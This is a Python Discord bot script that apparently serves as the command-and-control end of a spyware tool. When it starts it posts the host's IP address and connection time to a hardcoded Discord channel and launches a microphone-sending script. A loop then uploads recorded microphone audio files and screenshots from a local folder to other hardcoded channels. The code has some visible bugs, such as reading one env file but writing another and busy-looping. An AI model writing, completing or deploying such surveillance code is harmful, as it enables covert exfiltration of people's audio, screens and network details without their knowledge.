import discord
from discord.ext import commands
import os
import socket
import time
import subprocess
from dotenv import load_dotenv
load_dotenv(".env")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=';', intents=intents)

def update_env_variable(key, value):
    load_dotenv("src\\data.env")
    
    with open('.env', 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.startswith(f"{key}="):
            lines[i] = f"{key}={value}\n"
            break
    
    with open('src\\data.env', 'w') as file:
        file.writelines(lines)

async def listen():
    while True:
        runMic = os.getenv('runMic')
        micCount = os.getenv('micCount')
        runScreen = os.getenv('runScreen')
        screenCount = os.getenv('screenCount')

        if runMic is None:
                continue
        
        elif runMic == "True":
            mic_path = f"files\\{micCount}.wav"
            guild = await bot.fetch_guild("1198070162432200865")
            channel = await guild.fetch_channel("1209237919592615937")

            with open(mic_path, "rb") as mic_file:
                await channel.send(file=discord.File(mic_file, mic_path))
            
            update_env_variable('runMic', 'True')

        if runScreen is None:
            continue

        elif runScreen is not None:
            screenshot_path = f"files\\{screenCount}.png"
            guild = await bot.fetch_guild("1198070162432200865")
            channel = await guild.fetch_channel("1209205802032955413")

            with open(screenshot_path, 'rb') as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, screenshot_path))

        time.sleep(0.1)

@bot.event
async def on_ready():
    guild = await bot.fetch_guild("1198070162432200865")
    channel = await guild.fetch_channel("1209247219874668638")

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    await channel.send(f"{ip_address} connected at {time.strftime('%H:%M:%S')}")
    subprocess.run(["python", "mic_sender.py"])

bot.run(os.getenv("TOKEN"))